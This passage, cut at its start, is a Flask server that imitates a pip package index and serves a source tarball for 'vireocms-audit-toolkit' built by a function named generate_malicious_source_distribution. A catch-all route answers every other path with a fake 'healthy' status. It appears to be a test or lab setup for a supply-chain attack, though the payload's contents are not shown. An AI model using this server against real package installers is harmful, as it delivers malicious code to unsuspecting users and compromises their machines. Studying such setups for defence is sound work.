            name="vireocms-audit-toolkit-1.0.0/vireocms_audit_toolkit/__init__.py"
        )
        info_init.size = len(init_bytes)
        tar.addfile(info_init, io.BytesIO(init_bytes))

    out.seek(0)
    return out


# PEP 503 simple index
@app.route("/simple/vireocms-audit-toolkit/")
def pip_simple_index() -> tuple[str, int, dict[str, str]]:
    html_content = """<!DOCTYPE html>
<html>
  <head>
    <meta name="pypi:repository-version" content="1.0">
    <title>Links for vireocms-audit-toolkit</title>
  </head>
  <body>
    <h1>Links for vireocms-audit-toolkit</h1>
    <a href="/packages/vireocms-audit-toolkit-1.0.0.tar.gz" rel="internal">vireocms-audit-toolkit-1.0.0.tar.gz</a><br/>
  </body>
</html>
"""
    return html_content, 200, {"Content-Type": "text/html; charset=utf-8"}


# Package download
@app.route("/packages/vireocms-audit-toolkit-1.0.0.tar.gz")
def download_package() -> Response:
    try:
        archive_stream = generate_malicious_source_distribution()
        return send_file(
            archive_stream,
            mimetype="application/x-gzip",
            as_attachment=True,
            download_name="vireocms-audit-toolkit-1.0.0.tar.gz",
        )
    except Exception:
        abort(500)


# Catch-all health probe
@app.route("/<path:catchall>")
def catch_all(catchall: str) -> tuple[Response, int]:
    return jsonify({"status": "healthy", "scope": "compliance-node"}), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=False)